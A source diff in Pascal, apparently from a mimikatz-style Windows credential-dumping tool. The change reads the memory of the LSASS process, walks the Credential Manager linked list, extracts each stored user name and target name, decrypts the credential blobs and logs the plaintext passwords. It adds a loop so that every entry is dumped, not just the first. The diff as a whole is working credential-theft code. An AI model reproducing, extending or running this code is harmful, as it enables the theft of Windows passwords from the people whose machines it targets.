@@ -758,8 +758,8 @@ var
   logsesslist:array [0..sizeof(_KIWI_MSV1_0_LIST_63)-1] of byte;
   bytes:array[0..1023] of byte;
   password,decrypted:tbytes;
-  //username,domain:array [0..254] of widechar;
-  credentials:nativeuint;
+  username,domain:array [0..254] of widechar;
+  credentials,ptr,first:nativeuint;
   CREDENTIALW:_CREDENTIALW;
 begin
   if pid=0 then exit;
@@ -873,21 +873,33 @@ begin
                                    log('LUID:'+inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).LocallyUniqueIdentifier.lowPart ,sizeof(_LUID)),1) ;
                                    //
                                    credentials:=nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).CredentialManager);
-                                   log('CredentialManager:'+inttohex(credentials,sizeof(pvoid)),1);
+                                   log('->CredentialManager:'+inttohex(credentials,sizeof(pvoid)),1);
+                                   first:=0;
                                    if Credentials<>0 then
                                      begin
                                      //CredentialManager
                                      ReadMem  (hprocess,credentials,bytes);
-                                     log(inttohex(Pgeneric_list (@bytes[0]).unk4  ,sizeof(nativeuint)),1);
+                                     log(inttohex(Pgeneric_list (@bytes[0]).unk4  ,sizeof(nativeuint)),0);
                                      ReadMem  (hprocess,Pgeneric_list (@bytes[0]).unk4,bytes);
-                                     log(inttohex(Pgeneric_list (@bytes[0]).unk3  ,sizeof(nativeuint)),1);
-                                     log('CREDENTIALW:'+inttohex(Pgeneric_list (@bytes[0]).unk3-$58  ,sizeof(nativeuint)),1);
-                                     readmem(hprocess,Pgeneric_list (@bytes[0]).unk3-$58,@CREDENTIALW ,sizeof(CREDENTIALW));
-                                     log('CredentialBlobSize:'+inttostr(CREDENTIALW.CredentialBlobSize),1) ;
-                                     log('CredentialBlob:'+inttohex(nativeuint(CREDENTIALW.CredentialBlob),sizeof(nativeuint)),1) ;
+                                     ptr:=Pgeneric_list (@bytes[0]).unk3;
+                                     log(inttohex(ptr  ,sizeof(nativeuint)),0);
+                                     ReadMem  (hprocess,ptr,bytes);
+                                     //we should loop here
+                                     while 1=1 do
+                                     begin
+                                     log('Prev/Next:'+inttohex(Pgeneric_list (@bytes[0]).unk1,sizeof(nativeuint))+'/'+inttohex(Pgeneric_list (@bytes[0]).unk2,sizeof(nativeuint)),0);
+                                     if first=0 then first:=Pgeneric_list (@bytes[0]).unk1;
+                                     log('-CREDENTIALW:'+inttohex(ptr-$58  ,sizeof(nativeuint)),1);
+                                     readmem(hprocess,ptr-$58,@CREDENTIALW ,sizeof(CREDENTIALW));
+                                     readmem(hprocess,nativeuint(CREDENTIALW.UserName),@username[0],sizeof(username));
+                                     log('UserName:'+ username,1) ;
+                                     readmem(hprocess,nativeuint(CREDENTIALW.TargetName ),@username[0],sizeof(username));
+                                     log('TargetName:'+ username,1) ;
+                                     log('CredentialBlobSize:'+inttostr(CREDENTIALW.CredentialBlobSize),0) ;
+                                     log('CredentialBlob:'+inttohex(nativeuint(CREDENTIALW.CredentialBlob),sizeof(nativeuint)),0) ;
                                      //encrypted password is $e0 aka 224 bytes later
                                      //start of credential structure is -$58
-                                     //password - $110 is the pointed to the password
+                                     //password - $110 is the pointer to the password
                                      if CREDENTIALW.CredentialBlobSize>0 then
                                      begin
                                      setlength(password,CREDENTIALW.CredentialBlobSize);
@@ -898,10 +910,15 @@ begin
                                              then log('decryptLSA NOT OK',1)
                                              else
                                              begin
-                                             log(strpas (pwidechar(@decrypted[0]) ),1);
+                                             log('Password:'+strpas (pwidechar(@decrypted[0]) ),1);
                                              //log(BytetoAnsiString(decrypted),1);
                                              end;
                                      end;//if CREDENTIALW.CredentialBlobSize>0 then
+                                     if Pgeneric_list (@bytes[0]).unk2=first then break;
+                                     ptr:=Pgeneric_list (@bytes[0]).unk2;
+                                     log(inttohex(ptr  ,sizeof(nativeuint)),0);
+                                     ReadMem  (hprocess,ptr,bytes);
+                                     end; //while 1=1 do
                                      end; //if Credentials<>0 then
                                    //
                                    credentials:=nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).Credentials);
